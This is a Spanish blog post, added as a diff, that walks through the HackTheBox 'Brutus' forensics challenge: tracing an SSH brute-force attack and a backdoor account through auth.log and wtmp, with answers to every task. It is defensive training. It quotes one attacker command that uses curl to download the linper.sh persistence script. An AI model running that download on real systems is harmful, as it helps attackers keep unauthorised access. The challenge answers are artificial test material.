@@ -1,0 +1,170 @@
+---
+title: "Sherlock - Brutus - Español"
+summary: "Sherlock de HackTheBox sobre inicios de sesión no autorizados en un servidor Confluence.
+ Se proporcionan los archivos auth.log y wtmp para la investigación."
+date: "Jan 01 2025"
+draft: false
+tags:
+- HackTheBox
+- Sherlock
+- Very easy
+- Tutorial
+- Español
+---
+import SherlockBeginningTable from '/src/components/custom/SherlockBeginningTable.astro';
+import SherlockTask from '/src/components/custom/SherlockTask.astro';
+import CodeBlock from '/src/components/custom/CodeBlock.astro';
+import SherlockBodyImage from '/src/components/custom/SherlockBodyImage.astro';
+import SherlockFinalContent from '/src/components/custom/SherlockFinalContent.astro';
+import SimpleText from '/src/components/custom/SimpleText.astro';
+import { LANG_ES } from '/src/consts.ts';
+
+
+<SherlockBeginningTable  lang={LANG_ES} 
+  data={[
+    { content: `En este Sherlock de dificultad muy fácil, te familiarizarás con los registros auth.log y wtmp de Unix. 
+    Exploraremos un escenario en el que un servidor de Confluence fue atacado por fuerza bruta a través de su servicio SSH. 
+    Después de obtener acceso al servidor, el atacante realizó actividades adicionales, las cuales podemos rastrear utilizando auth.log. 
+    Aunque auth.log se utiliza principalmente para el análisis de fuerza bruta, profundizaremos en todo el potencial de este artefacto en nuestra investigación, 
+    incluyendo aspectos de escalada de privilegios, persistencia e incluso algo de visibilidad en la ejecución de comandos.` },
+    { content: "auth.log, wtmp" },
+  ]} />
+
+<div align="center">
+  <img width="500px" src="/public/sherlocks/brutus_images/Sherlock_logo.png" />
+</div> 
+
+## Tasks
+
+---
+
+<SherlockTask lang={LANG_ES} 
+    task_number="1" 
+    task_content="Analizando el auth.log, ¿puedes identificar la dirección IP utilizada por el atacante para llevar a cabo un ataque de fuerza bruta?" 
+    hint_content="Buscar palabras clave asociadas con intentos de fuerza bruta puede ayudar a identificar ataques potenciales." 
+    answer="65.2.161.68"/>
+
+- Podemos buscar por las palabras clave `Invalid user` para averiguar la IP del atacante con cualquiera de estos comandos: 
+
+<CodeBlock code={"grep \"Invalid user\" auth.log"}/>
+
+<CodeBlock code={"cat auth.log | grep \"Invalid user\""}/>
+
+- Los logs tienen este formato:
+
+<CodeBlock code={"Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380"}/>
+
+- Hay muchos intentos fallidos de inicio de sesión desde la IP 65.2.161.68 con cuentas de usuario que sugieren tener privilegios elevados (`admin`, `server_adm`, `svc_account` y `root`). Esa es la IP que buscamos.
+
+---
+
+<SherlockTask lang={LANG_ES} 
+    task_number="2" 
+    task_content="El ataque de fuerza bruta fue exitoso y el atacante ganó acceso a una cuenta en el servidor. ¿Cuál es el nombre de esa cuenta?" 
+    hint_content="Busca por palabras clave que indiquen un intento de inicio de sesión válido para identificar la cuenta comprometida." 
+    answer="root"/>
+
+- Echando un vistazo al archivo `auth.log` se puede ver que se ha ganado acceso con el usuario `root` desde la IP 65.2.161.68, que es la IP del atacante como hemos dicho anteriormente.
+
+<CodeBlock code={"Mar 6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2"}/>
+
+- Aunque podemos filtar por las palabras clave `Accepted password`:
+
+<CodeBlock code={"cat auth.log | grep \"Accepted password\""}/>
+
+---
+
+<SherlockTask lang={LANG_ES} 
+    task_number="3" 
+    task_content="¿Puedes identificar el timestamp correspondiente a cuando el atacante inició sesión manualmente en el servidor para llevar a cabo sus objetivos?" 
+    hint_content="Es importante señalar que el primer inicio de sesión exitoso por parte del atacante fue el resultado de un intento de fuerza bruta automatizado, 
+    y la sesión se cerró dentro del mismo segundo en que se estableció. Después de obtener las credenciales válidas, el atacante inició sesión manualmente, y 
+    necesitamos identificar ese inicio de sesión. Utiliza el artefacto wtmp para ver el tiempo de inicio de sesión de la sesión activa y correlacionarlo con auth.log." 
+    answer="2024-03-06 06:32:45"/>
+
+- Debido a que en `auth.log` el timestamp tiene este formato `Month Day HH:mm:SS` y el formato que se pide es `YYYY-MM-DD HH:mm:SS` tenemos que buscar en el archivo `wtmp`.
+- Con este comando se ven todos inicios de sesion en ese archivo:
+
+<CodeBlock code={"utmpdump wtmp"}/>
+    
+- Pero podemos filtrar por el nombre de usuario con el que el atacante ganó acceso, que en este caso es lo que nos interesa:
+
+<CodeBlock code={"utmpdump wtmp | grep 'root'"}/>
+
+<SherlockBodyImage src="/sherlocks/brutus_images/Brutus_task_3.png"/>
+
+- Se puede apreciar que en la última línea se encuentra el inicio de sesión de la IP 65.2.161.68 con un formato similar a `YYYY-MM-DD HH:mm:SS`. Ahí está nuestra respuesta.
+
+---
+
+<SherlockTask lang={LANG_ES} 
+    task_number="4" 
+    task_content="Los inicio de sesión SSH se rastrean y se les asigna un número al iniciar sesión. ¿Cuál es el número de sesión asignado a la sesión del atacante para la cuenta de usuario de la pregunta 2?" 
+    hint_content="Se asigna un número de sesión de forma automática inmediatamente después de que la contraseña sea aceptada." 
+    answer="37"/>
+
+- Teniendo en cuenta el timestamp anterior podemos buscar en `auth.log` cerca de esa hora.
+- Buscamos por esa hora y esos minutos (aunque también podríamos buscar por el usuario `root`):
+
+<CodeBlock code={"cat auth.log | grep '06:32'"}/>
+
+<SherlockBodyImage src="/sherlocks/brutus_images/Brutus_task_4.png"/>
+
+- Vemos que un segundo antes (06:32:44) se le asigna el número 37 a la sesión del usuario `root`.
+
+---
+
+<SherlockTask lang={LANG_ES} 
+    task_number="5" 
+    task_content="El atacante agregó un nuevo usuario como parte de su estrategia de persistencia en el servidor y le otorgó a esta nueva cuenta de usuario privilegios elevados. ¿Cuál es el nombre de esta cuenta?" 
+    hint_content="Auth.log también rastrea cambios relacionados con usuarios y grupos en el servidor. Busca palabras clave que indiquen adiciones de usuarios o asignaciones de privilegios." 
+    answer="cyberjunkie"/>
+
+- Revisando el archivo `auth.log` nos damos cuenta que, tras ganar acceso, el atacante crea un nuevo usuario con el nombre `cyberjunkie`, a través del comando `useradd`, con la finalidad de mantener acceso persistente en el sistema (crear una puerta trasera):
+    
+<CodeBlock code={"Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1"}/>
+
+---
+
+<SherlockTask lang={LANG_ES} 
+    task_number="6" 
+    task_content="¿Cuál es el ID de la sub-técnica de MITRE ATT&CK utilizado para la persistencia al crear una nueva cuenta?" 
+    hint_content="Si has encontrado la respuesta a la pregunta 5, consulta la `MITRE ATT&CK enterprise matrix` para determinar el ID de sub-técnica bajo la táctica de persistencia." 
+    answer="T1136.001"/>
+
+- Para ello vamos a la URL https://attack.mitre.org y buscamos en **Persistence > Create Account > Local Account**.
+
+---
+
+<SherlockTask lang={LANG_ES} 
+    task_number="7" 
+    task_content="¿A qué hora terminó la primera sesión SSH del atacante según auth.log?" 
+    answer="2024-03-06 06:37:24"/>
+
+- Conociendo el número de sesión SSH, podemos filtrar por él de esta forma:
+    
+<CodeBlock code={"cat auth.log | grep 'session 37'"}/>
+    
+<SherlockBodyImage src="/sherlocks/brutus_images/Brutus_task_7.png"/>
+
+- La segunda línea indica la hora en que se cerró la sesión, con el estado `Removed session 37`.
+
+---
+
+<SherlockTask lang={LANG_ES} 
+    task_number="8" 
+    task_content="El atacante inició sesión en la cuenta que creó como puerta trasera y utilizó sus privilegios más altos para descargar un script. ¿Cuál es el comando completo ejecutado usando sudo?" 
+    hint_content='Aunque auth.log no se utiliza típicamente para rastrear ejecuciones de comandos como auditd, los comandos ejecutados con sudo se registran en auth.log, ya que el sistema necesita autenticar los privilegios de la cuenta para otorgar permisos de nivel root para ese comando. Busca la palabra clave "COMMAND" para encontrar los comandos ejecutados usando sudo.'
+    answer="/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh"/>
+
+- El sistema necesita autenticar la cuenta para dar permisos de administrador a los comandos ejecutados con `sudo`, con lo cual quedarían registrados en `auth.log`, tal y como dice la pista. Podemos filtrar por:
+    
+<CodeBlock code={"cath auth.log | grep \"COMMAND\""}/>
+ 
+<SherlockBodyImage src="/sherlocks/brutus_images/Brutus_task_8.png"/>   
+
+- Una de las líneas nos muestra que se ejecutó el comando `curl` y la URL del script que se descargó el atacante.
+
+---
+
+<SherlockFinalContent lang={LANG_ES}/>
